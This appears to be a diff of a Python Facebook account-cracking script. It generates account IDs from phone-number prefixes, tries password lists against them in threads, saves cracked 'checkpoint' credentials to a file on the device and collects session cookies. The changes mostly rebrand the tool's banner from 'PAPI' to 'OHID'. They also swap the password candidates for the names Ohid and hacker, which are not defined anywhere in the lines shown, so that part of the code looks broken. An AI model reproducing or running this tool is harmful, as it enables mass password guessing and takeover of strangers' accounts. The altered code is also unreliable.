@@ -29,7 +29,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
     else:
-        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
+        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{GREEN}'%(BLUE))
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         else:
@@ -208,7 +208,7 @@ def xxr():
     print(logo)
     print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,018,92302,92301,91778{x}')
     os.system('xdg-open https://facebook.com/groups/668666148068158/');time.sleep(1)
-    print(" \x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mPAPI\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●")
+    print(" \x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mOHID\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●")
     rk1 = '0171'
     rk2 = '0172'
     rk3 = '0175'
@@ -242,10 +242,10 @@ def xxr():
             pwx = [love[1:]]
             uid = code+love
             for Anak in Mimid:
-                pwx.append(Anak)
-                pwx.append(love)
+                pwx.append(Ohid)
+                pwx.append(hacker)
             manshera.submit(rcrack,uid,pwx,tl)
-    print(f"\n{x} \x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mPAPI\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●")
+    print(f"\n{x} \x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1; 46mOHID\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●")
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
@@ -302,14 +302,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;31m [PAPI-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                #print('\r\r\33[1;31m [OHID-CP😟] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/PAPI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s {x}[{xr}PAPI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s {x}[{xr} OHID{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
